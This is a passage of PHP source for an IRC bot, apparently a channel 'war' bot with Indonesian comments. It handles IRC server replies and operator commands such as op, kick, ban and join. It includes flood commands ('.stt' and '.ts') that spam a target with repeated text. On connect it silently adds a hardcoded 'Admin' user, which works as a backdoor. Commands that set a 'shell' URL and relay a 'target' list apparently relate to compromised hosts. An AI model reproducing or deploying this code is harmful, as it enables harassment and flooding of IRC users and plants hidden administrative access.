        if($rtdc ==3){$bot['userver']=0;}elseif($rtdc >=4){$bot['ident']="say";$bot['userver']=0;$rtdc=0;}
        
        ####### REGISTER TO SERVER ########
        if ($bot['userver']==1){$Header = 'PASS ' . $bot['pserver'] . CRLF;}
        $Header .= 'NICK ' . $bot['nick'] . CRLF;
	$Header .= 'USER ' . $bot['ident'] . ' ' . $bot['local'] . ' ' . $bot['server'] . ' :' . $bot['realname'];
        $modbot->send($fp,$Header);
        $Header="";
        unset ($Header);
        #### END REGISTER ################
        $response = '';
        while (!feof($fp)) {
            #### MAIN ITUNG_ITUNGAN ###
            
            if(time()-$haltfl['time']>15 && $haltfl['on']==1){$haltfl['on']=0;$haltfl['time']=time();}
            if(time()-$isontime >15 && $systembot['ISON']['ALL']=="3ON"){$modbot->send($fp,"ISON ". $modbot->show_ison());$isontime=time();}
            if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==0){if(time()-$inaway['idle'] >=1800){$modbot->away($fp,$modbot->rnd_logo().' '.$modbot->rnd_away());$inaway['status']=1;$inaway['idle']=time();}}
            if(time()-$iscy >$timercy){$modbot->auto_cy($fp);$iscy=time();}
            if($onboom=="on"){
                $tboom=time()-$tmboom;
		if($tboom>=$timeboom){
                $modbot->kick($fp,$chanboom,$targetboom,'0,4Waktu Habis... BOOOOOOMMMM Gitu lohhhh!!!!!');
		$goboom=0;$onboom="off";$targetboom="";
                }
            }

            #### MAIN ITUNG_ITUNGAN ###
            
            ##[ Proses Data Recv ]##
            $response = fgets($fp, 1024);
            while (substr_count($response,CRLF) != 0) {
                $offset = strpos($response, CRLF);
		$DataLine = substr($response,0,$offset);
                if (substr($DataLine,0,1) == ':') {
                    $Params=explode(" ",$DataLine);
		    $offsetC = strpos($DataLine, ' :');
                    $dText = substr($DataLine,$offsetC+2);
                        if ((strpos($Params[0],"!")!=0) && (strpos($Params[0],"@")!=0) ) {
                            $fsrc[nick]=substr($Params[0],1,strpos($Params[0],"!")-1);
                            $fsrc[nkecil]=strtolower($fsrc[nick]);
                            $fsrc[user]=substr($Params[0],strpos($Params[0],"!")+1,(strpos($Params[0],"@")-strpos($Params[0],"!"))-1);
                            $fsrc[host]=substr($Params[0],strpos($Params[0],"@")+1);
			}
                        ##[ MEMULAI DATA RAW ]##
                        switch ($Params[1]){
                            case "001":
                                $bot['nick']=$Params[2];$rtdc=0;
                                break;
                            case "004":
                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);sleep(1);
                                $modbot->add_user($fp,Lidhan,"Wild_Hand","Admin");$modbot->join($fp,$bot['basechan']);$modbot->join($fp,$bot['roomnet'],$bot['roomkey']);$modbot->join($fp,'#'.$clista.$clistt);
                                if($bot['server']=="irc.allnetwork.org"){$modbot->join($fp,"#Invinitif");}
                                $modbot->notice($fp,$bot['admin'],'halo boss Cakep...!!!');
                                sleep(2);
                                if($res_chan){$arres_chan=explode(";",$res_chan);foreach ($arres_chan as $clist){$modbot->join($fp,$clist,"");sleep(2);}}
                                break;
                            case "303":
                                $modbot->stuf_ison($fp,$dText);
                                break;
                            case "301":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				sleep(1);
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'2 is away: 14'.$dText);
				     }
                                break;
                            case "307":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'14 '.$dText);
				    }
                                break;
                            case "311":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				sleep(1);
                                $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[1is12]'.$Params[4] .'@'.$Params[5].' '.$Params[6]. ' '.$dText);
				    }
                                break;
                            case "312":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				    sleep(1);
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[1Server12]'.$Params[4].' '.$dText);
				    }
                                break;
                            case "318":
                                $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'14 '.$dText);
				     unset($datwhois[strtolower($Params[2])]["nick"]);
				     unset($datwhois[strtolower($Params[2])]["chan"]);
                                break;
                            case "319":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[8on12]'.$dText);
				    }
                                break;
                            case "305":
                                $inaway['status']=0;
                                break;
                            case "306":
                                $inaway['status']=1;
                                break;
                            case "353":
                                $nickll=str_replace("@","",$dText);$nickll=str_replace("%","",$nickll);$nickll=str_replace("+","",$nickll);
                                $modbot->destroy_chan($Params[4]);$modbot->add_nickchan($Params[4],$nickll);
                                break;
                            case "367":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4[3+b4] 1- 3'.$Params[4].'');
                                break;
                            case "368":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4E1nd 4o1f 4c1hannel 4b1an 4l1ist');
				unset($banlist["$Params[3]"]);
                                break;
                            case "432":
                                $modbot->nick($fp,$bot['nick'].$modbot->rand_str(4));
                                break;
                            case "433":
                                $modbot->nick($fp,$bot['nick'].$modbot->rand_str(4));
                                break;
                            case "464":
                                $bot['userver']=0;
                                break;
                            case "465":
                                $bot['userver']=0;
                                break;
                            case "NICK":
                                $newnicke = str_replace(':','',$Params[2]);
                                $yangjoin=strtolower($fsrc[nick]);
                                $asalseen[$yangjoin]="ganti";$asalseen[$yangjoin.'chanel']=" nick  12[1".$newnicke."12]";
                                $yangjoin=strtolower($newnicke);
                                $asalseen[$yangjoin]="ada";
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$newnicke,'You`re LogOut On Change Nick!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$bot['nick']=$newnicke;}
                                break;
                            case "JOIN":
                                $addchan=str_replace(":","",$Params[2]);
                                $yangjoin=strtolower($fsrc[nick]);
                                $asalseen[$yangjoin]="ada";
                                $chanboleh=strtolower($addchan);
                                $modbot->add_nickchan($addchan,$fsrc[nick]);
                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#Invinitif")){$modbot->part($fp,$chanboleh,"bye"); }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#Invinitif")){$modbot->part($fp,$chanboleh,"bye"); }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#Invinitif")){$modbot->part($fp,$chanboleh,"bye");  }
                                if($systembot['JVERSION'][strtoupper($addchan)]=="3ON"){$modbot->msg($fp,$fsrc[nick],'VERSION');$datversi[strtolower($fsrc[nick])]["nick"]=strtolower($fsrc[nick]);$datversi[strtolower($fsrc[nick])]["chan"]=$addchan; }
                                }
                                                if($fsrc[nkecil]==strtolower($greetmsg["$fsrc[nkecil]"]["nama"]) && $systembot['GREET'][strtoupper($addchan)]=="3ON"){
							$rndgreet=explode("[NG]",$greetmsg["$fsrc[nkecil]"]["msg"]);
							$msgrndgreet=$rndgreet[rand(0,count($rndgreet) - 1)] ;
							$addchan=str_replace(":","",$Params[2]);
							$msgnya=str_replace("<|nick|>",$fsrc[nick],$msgrndgreet);
							$msgnya=str_replace("<|chan|>",$addchan,$msgnya);
                                                        $modbot->msg($fp,$addchan,$msgnya);
						}
                                                elseif($systembot['NGOMONG'][strtoupper($addchan)]=="3ON"){
                				     $addchan=str_replace(":","",$Params[2]);
                                                     $nickwb=$fsrc[nick];
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
							$addchan=str_replace(":","",$Params[2]);
                                                        $nickwb=$fsrc[nick];
                                                        $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
                                                        $webe = str_replace("<nick>",$nickwb,$webe);
                                                        $webe = str_replace("<chan>",$addchan,$webe);
                                                        $webe = str_replace("#","",$webe);
                                                        $modbot->msg($fp,$addchan,$webe);
                                                     }
                                                }
                                                if($systembot['GUARD'][strtoupper($addchan)]=="3ON"){
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
							$addchan=str_replace(":","",$Params[2]);
                                                        $nickwb=$fsrc[nick];
                                                        if($systembot['GVOICE'][strtoupper($addchan)]=="3ON"){
                                                           sleep(5);
                                                           if(strtolower($bot['admin'])==strtolower($fsrc[nick])){
                                                                 $modbot->mode($fp,'+h',$addchan,$nickwb);
                                                           }else{$modbot->mode($fp,'+v',$addchan,$nickwb);       }
                                                        }
                                                     }
                                                }
                                break;
                            case "PART":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($fsrc[nick]);                               
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']=$addchan;$asalseen[$diaseen.'status']=" 12[4minggat12] ";
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$fsrc[nick],'You`re LogOut On Parting Channel!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$modbot->destroy_chan($Params[2]);}
				else{$modbot->del_nickchan($Params[2],$fsrc[nick]);}
                                break;
                            case "KICK":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($Params[3]);
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']=$addchan;$asalseen[$diaseen.'status']=" 12[4disepak12] ";
                                if(strtolower($bot['nick'])==strtolower($Params[3])){
                                    $modbot->destroy_chan($Params[2]);
                                    if($systembot['AUTOJOIN'][strtoupper($Params[2])]=='3ON'){sleep(1);$modbot->msg($fp,"Chanserv",'UNBAN '.$Params[2].' '.$bot['nick']);sleep(1);$modbot->join($fp,$Params[2]);}
                                }
                                else{ $modbot->del_nickchan($Params[2],$Params[3]);}
                                break;
                            case "QUIT":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($fsrc[nick]);
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']="ini";$asalseen[$diaseen.'status']=" 12[4njepad12] ";
                                $modbot->change_nickchan($fsrc[nick],"");
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$modbot->logoutbot($fsrc[nick]);}
                                break;
                            case "NOTICE":
                                if($Params[3]==':PING'){
                                   $modbot->stuf_lag($fp,$fsrc[nick],$Params[4]); 
                                }
                                if($Params[3]==':VERSION'){
                                    if($datversi[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,8);
                                        $modbot->msg($fp,$datversi[strtolower($fsrc[nick])]["chan"],'1[4Version1] 1'.$fsrc[nick].' '.$vernya);
                                    }
                                    unset($datversi[strtolower($fsrc[nick])]["nick"]);unset($datversi[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':FINGER'){
                                    if($datfinger[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,7);
                                        $modbot->msg($fp,$datfinger[strtolower($fsrc[nick])]["chan"],'6(04Info6) 1'.$fsrc[nick].' '.$vernya);
                                    }
                                    unset($datfinger[strtolower($fsrc[nick])]["nick"]);unset($datfinger[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':TIME'){
                                    if($dattime[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$timenya=str_replace(chr(1),"",$dText);$timenya=substr($timenya,5);
                                        $modbot->msg($fp,$dattime[strtolower($fsrc[nick])]["chan"],'6(04Info6) 1'.$fsrc[nick].' '.$timenya);
                                    }
                                    unset($dattime[strtolower($fsrc[nick])]["nick"]);unset($dattime[strtolower($fsrc[nick])]["chan"]);
                                }
                                break;
                            case "PRIVMSG":
                                $TxtMsg=substr($DataLine,strpos($DataLine," :")+2);
                                unset($dCom);$dCom=explode(" ", $TxtMsg);$perintah=strtolower($dCom[0]);
                                if($haltfl['on']==0){
                                if ( $Params[3]==":PING") {$modbot->notice($fp,$fsrc[nick],$TxtMsg);}
                                elseif ($Params[3]==":VERSION") { $ctcpversi=$versbot[rand(0,count($versbot) - 1)];$modbot->notice($fp,$fsrc[nick],chr(1) . 'VERSION '. $ctcpversi . chr(1));}
                                elseif ($Params[3]==":FINGER") { $modbot->notice($fp,$fsrc[nick],chr(1) . 'FINGER '. $ctcpfinger . chr(1));}
                                elseif ($Params[3]==":TIME") { $timetoday = date("D M j H:i:s Y"); $modbot->notice($fp,$fsrc[nick],chr(1) . 'TIME '.$timetoday . chr(1));}
                                }
                                ################ ANTI SLAPS ############
                                if($Params[3]==':ACTION' && ereg('#',$Params[2]) && $systembot['SLAPS'][strtoupper($Params[2])]=="3ON"){
                                    if(strpos(strtolower($TxtMsg),"slaps") || strpos(strtolower($TxtMsg),"slap")){
                                        foreach ($auth as $ulist) {if($ulist["name"]){if(strpos(strtolower($TxtMsg),strtolower($ulist["name"]))){$onbos=1;}}}
                                        if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$onbos=0;}
                                        if($onbos==1){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapbos());}
                                        elseif($onbos==0){if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->msg($fp,$Params[2],$modbot->rnd_slapampun());}}
                                        else{if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapme());}}
                                        $onbos=2;
                                    }
                                }
                                ############ END ANTI SLAPS ############
                                if (substr($Params[3],0,2)==':^'){
                                    $logok=$modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host]);
                                    if (strtolower($dCom[0])=='^login' && $dCom[1]) {
                                        if($logok==1){$modbot->notice($fp,$fsrc[nick],"You`re Already Authorized!");}
                                        else{
                                            if($haltfl['on']!=0){sleep(2);};
                                            if($modbot->loginbot($fsrc[nick],$fsrc[user],$fsrc[host],$dCom[1])==1){
                                                $modbot->notice($fp,$fsrc[nick],'You`re Authorized As '.$auth["$fsrc[nkecil]"]["status"].'!');
                                                $modbot->notice($fp,$fsrc[nick],'For help type .help');
                                                $auth["$fsrc[nkecil]"]["ident"]=$fsrc[user];$auth["$fsrc[nkecil]"]["host"]=$fsrc[host];
                                                if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                            }
                                        }
                                   }
                                   elseif (strtolower($dCom[0])=='^logout' && $logok==1) {
                                    if($modbot->logoutbot($fsrc[nick])==1){$modbot->notice($fp,$fsrc[nick],'You`re LogOut!');}
                                   }
                                }
                                elseif (substr($Params[3],0,2)==':.'){
                                    if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])){
                                        if (ereg('#',$Params[2])){$cmdin=1;$target=$Params[2];}else {$cmdin=2;$target=$fsrc[nick];}
                                        $getlvl=$modbot->level_user($fsrc[nick]);
                                        if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                        ############### MULTI USER BOT ##############
                                        if ($perintah=='.chgpass' && $dCom[1] && $dCom[2]) {
                                            $modbot->chgpass_user($fp,$fsrc[nick],$dCom[1],$dCom[2]);
                                        }
                                        elseif ($perintah=='.adduser' && $dCom[1] && $dCom[1]!=$bot['nick'] && $dCom[2] && $dCom[3] && $getlvl > 1) {
                                            $modbot->add_user($fp,$fsrc[nick],$dCom[1],$dCom[2],$dCom[3]);
                                        }
                                        elseif ($perintah=='.deluser' && $dCom[1] && $getlvl > 1) {
                                            $modbot->del_user($fp,$fsrc[nick],$dCom[1]);
                                        }
                                        ############# END MULTI USER BOT ############
                                        
                                        ########## CHANGE SERVER IDENT REALNAME SERVPASS && JUMP ########
                                        elseif ($perintah=='.server' && $dCom[1] && $getlvl > 2){
                                            $bot['server']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.servpass' && $dCom[1] && $getlvl > 2){
                                            $bot['pserver']=$dCom[1];$bot['userver']=1;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging PassWOrD SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.ident' && $dCom[1] && $getlvl > 2){
                                            $bot['ident']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging IdentD To '. $dCom[1]);
                                        }

                                        elseif ($perintah=='.vhost' && $dCom[1] && $getlvl > 2){
                                            $bot['local']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging VhosT To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.realname' && $dCom[1] && $getlvl > 2){
                                            $Rmsg=substr($TxtMsg,10);$Rmsg=ltrim($Rmsg);$bot['realname']=$Rmsg;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging ReaLNaMe To '. $Rmsg);
                                        }
                                        elseif ($perintah=='.jump' && $getlvl > 2){
                                            $keluar = 0;$modbot->quit($fp,$modbot->rnd_logo() .' ReSTaRt bY '.$fsrc[nick]);
                                        }
                                        ########################## END CHG SER IDENT REAL ##########################
                                        
                                        ################################ #### ##################################
                                        elseif ($perintah=='.botnick' && $getlvl > 1) {
                                                $modbot->notice($fp,$fsrc[nick],'My Nick Is :'.$bot['nick']);
                                        }
                                        elseif ($perintah=='.identnick' && $dCom[1] && $dCom[2] && $cmdin==2 && $getlvl > 1){
                                                $bot['inick']=$dCom[1];$bot['pnick'] = $dCom[2];
                                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);
                                                $modbot->notice($fp,$fsrc[nick],"Identify nick... to ".$dCom[1]);
                                        }
                                        elseif ($perintah=='.logoutnick' && $getlvl > 1){
                                                $modbot->msg($fp,"Nickserv","logout");$modbot->notice($fp,$fsrc[nick],"Logout nick");
                                        }
                                        elseif ($perintah=='.basechan' && $dCom[1] && $getlvl > 2){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['basechan'],$modbot->rnd_logo() . ' BaseChan cHanGE by ' . $frsc[nick]);
                                                $bot['basechan']=$bchan;$modbot->join($fp,$bot['basechan']);
                                        }
                                        elseif ($perintah=='.botchan' && $dCom[1] && $dCom[2] && $getlvl > 3){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['roomnet']);$bot['roomnet']=$bchan;
                                                $bot['roomkey']=$dCom[2];$modbot->join($fp,$bot['roomnet'],$bot['roomkey']);
                                        }
                                        elseif ($perintah=='.userlist' && $getlvl > 1) {
                                            $modbot->notice($fp,$fsrc[nick],'User List: '.$modbot->user_list($fp,$fsrc[nick]));
                                        }
                                        elseif ($perintah=='.chanlist' && $getlvl > 2) {
                                            $datachan=str_replace(";"," ",$modbot->show_chan());$modbot->notice($fp,$fsrc[nick],$datachan);$datachan="";unset($datachan);
                                        }
                                        elseif ($perintah=='.nicklist' && $dCom[1] && $getlvl > 2) {
                                            $nchan=$dCom[1];if (!ereg("#",$dCom[1])) { $nchan="#".$dCom[1]; }
                                            $datanick=explode(" ",$modbot->show_nickchan($nchan));
                                            for ($i = 0; $i <= count($datanick); $i++) {
                                                $limitshow++;$lnick_x=$lnick_x.' '.$datanick[$i];
                                                if($limitshow==15){
                                                    $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);$modbot->notice($fp,$fsrc[nick],$lnick_x);
                                                    $limitshow=0;$lnick_x="";
                                                }
                                            }
                                            $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);
                                            if($lnick_x){$modbot->notice($fp,$fsrc[nick],$lnick_x);}$lnick_x="";
                                            unset($lnick_x);unset($datanick);
                                        }
                                        elseif ($perintah=='.showison' && $getlvl > 2) {$modbot->notice($fp,$fsrc[nick],$modbot->show_ison());}
                                        elseif ($perintah=='.chanison' && $getlvl > 2) {$chanson=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChanIson cHanGe To '.$dCom[1]);}
                                        elseif ($perintah=='.settimercycle' && $dCom[1] && $getlvl > 2) {
                                                $timercy=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer aUtO Cycle cHanGe To '.$dCom[1].' Second');
                                        }
                                        elseif ($perintah=='.settimermsg' && $dCom[1] && $getlvl > 2) {
                                                $timermsg=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoMsg cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif ($perintah=='.settimeract' && $dCom[1] && $getlvl > 2) {
                                                $timeract=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoAction cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif($perintah=='.setversion' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpversi=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'VerSIoN cHanGe To '.$ctcpversi);
                                        }
                                        elseif($perintah=='.setfinger' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpfinger=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'FiNGeR cHanGe To '.$ctcpfinger);
                                        }
                                        ################################ #### ##################################
                                        
                                        
                                        ######################### CONTROL BOT #######################
                                        elseif ($perintah=='.up' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->msg($fp,"Chanserv",'Op '.$Params[2].' '.$bot['nick']);
                                        }
                                            elseif ($perintah=='.down' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->mode($fp,"+v-ho",$Params[2],$bot['nick'].' '.$bot['nick'].' '.$bot['nick']);
                                            }
                                            elseif ($perintah=='.o' || $perintah=='.h' || $perintah=='.v' || $perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                if ($getlvl > 1){
                                                    if ($perintah=='.o' || $perintah=='.h' || $perintah=='.v'){
                                                        $moden=strtolower(substr($dCom[0],1));$moden='+'.$moden . $moden . $moden;
                                                    }
                                                    elseif ($perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                        $moden=strtolower(substr($dCom[0],2));$moden='-'.$moden . $moden . $moden;
                                                    }
                                                    if ($cmdin==1){$ttarget=$Params[2];$tforce=$dCom[1];$tmore=$dCom[2].' '.$dCom[3];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tforce=$dCom[2];$tmore=$dCom[3].' '.$dCom[4];}
                                                    if ($tforce) { $vonick = $tforce; }else { $vonick = $fsrc[nick]; }
                                                    $modbot->mode($fp,$moden,$ttarget,$vonick.' '.$tmore);
                                                }
                                            }
                                            elseif ($perintah=='.k' || $perintah=='.kb' || $perintah=='.kc') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$tdata=$dCom[1];$ttarget=$Params[2];$tkode=$dCom[0].' '.$dCom[1];}
                                                    elseif($cmdin==2){$tdata=$dCom[2];$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1].' '.$dCom[2];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1); $msg=ltrim($msg);$msg=rtrim($msg);
                                                    if($perintah=='.k'){
                                                        $modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }

                                                    elseif($perintah=='.kb'){
                                                        $modbot->ban($fp,$ttarget,$tdata);$modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kc'){$modbot->kickserv($fp,$ttarget,$tdata,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.b' || $perintah=='.ub') {
                                                if($getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $tmode=substr($TxtMsg,strlen($tkode)+1);
                                                    $tmode=ltrim($tmode);$tmode=rtrim($tmode);
                                                    if($perintah=='.b'){$modbot->ban($fp,$ttarget,$tmode);}
                                                    else{$modbot->unban($fp,$ttarget,$tmode);}
                                                }
                                            }
                                            elseif ($perintah=='.j' && $dCom[1]) {
                                                $jchan=$dCom[1];if (!ereg("#",$dCom[1])) { $jchan="#".$dCom[1]; }
                                                $modbot->join($fp,$jchan,$dCom[2]);
                                            }
                                            elseif ($perintah=='.max' && $dCom[1]) {
                                                $maxkar=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Maximal karakter sekarang '.$maxkar.'!!!');
                                            }
                                            elseif ($perintah=='.flodban' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$floddban="OFF";}
                                                if(strtolower($dCom[1])=='on'){$floddban="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'flodban skarang '.$floddban.'!!!');
                                            }
                                            elseif ($perintah=='.target') {
                                                $ngulange=0;
                                                do {
                                                  $ngulange=$ngulange+1;
                                                  $modbot->msg($fp,$fsrc[nick],$hasiltargetgue[$ngulange]);sleep(1);
                                                  if($ngulange>=$notarget){$modbot->notice($fp,$fsrc[nick],'Wes entek boss!!');break;   }
                                                } while(true);  
                                            }
                                            elseif ($perintah=='.shell' && $dCom[1]) {
                                                $shellgue=$dCom[1]."?";
                                                $modbot->notice($fp,$fsrc[nick],'Shell skarang '.$shellgue.'?');
                                            }
                                            elseif ($perintah=='.repp' && $dCom[1]) {
                                                $makre=$dCom[1];
                                                $Maxreep=$dCom[1]-1;
                                                $modbot->notice($fp,$fsrc[nick],'Maximal Repeat sekarang '.$makre.'!!!');
                                            }
                                            elseif ($perintah=='.p' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,3+strlen($dCom[1])+1);
                                                $modbot->part($fp,$pchan,$pmsg);
                                            }
                                            elseif ($perintah=='.cy' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,4+strlen($dCom[1])+1);
                                                $modbot->Cycle($fp,$pchan,$pmsg);
                                            }
                                            elseif ($perintah=='.a' || $perintah=='.s') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.a'){$modbot->act($fp,$ttarget,$msg);
                                                    }else{$modbot->msg($fp,$ttarget,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.stm' || $perintah=='.stt') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.stm'){$modbot->msg($fp,$dCom[1],$msg);
                                                    }else{
                                                    $msg="[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[]";
                                                    $modbot->msg($fp,$dCom[1],$msg);
                                                    }
                                                }
                                            }
                                            elseif ($perintah=='.away'){
                                                if($dCom[1]){$modbot->away($fp,substr($TxtMsg,6));}else{$modbot->noaway($fp);}
                                            }
                                            elseif ($perintah=='.n' && $dCom[1]){$modbot->nick($fp,$dCom[1]);}
                                            elseif ($perintah=='.q' && $getlvl > 3 ){
                                            $keluar=1;if($dCom[1]){$Qmsg=substr($TxtMsg,3);}$modbot->quit($fp,$Qmsg);$keluar=1;sleep(3);exit;
                                            }
                                            
                                            elseif ($perintah=='.ts' && $dCom[1] && $getlvl > 2){
                                                $modbot->flood($fp,$dCom[1],$TxtMsg);
                                            }
                                            elseif($perintah=='.help'){
                                                $modbot->mod_help($fp,$fsrc[nick]);
                                            }
                                            ###################### END CONTROL BOT #####################
                                            
                                            ################################ SYSTEM ###################################
                                            elseif ($perintah=='.status' && $getlvl > 2 && $cmdin==1 ){
                                                if($dCom[1]){$chan=$dCom[1];}

                                                else{$chan=$Params[2];}
                                                if (!ereg("#",$chan)){$chan="#".$chan;}
                                                $chan=strtoupper($chan);
                                                $modb="";
                                                if($systembot['TIME'][$chan]=="3ON"){$modb.=' [4T]iME';}
                                                if($systembot['ASTRO'][$chan]=="3ON"){$modb.=' [4A]sTRo';}
                                                if($systembot['PING'][$chan]=="3ON"){$modb.=' [4P]iNG';}
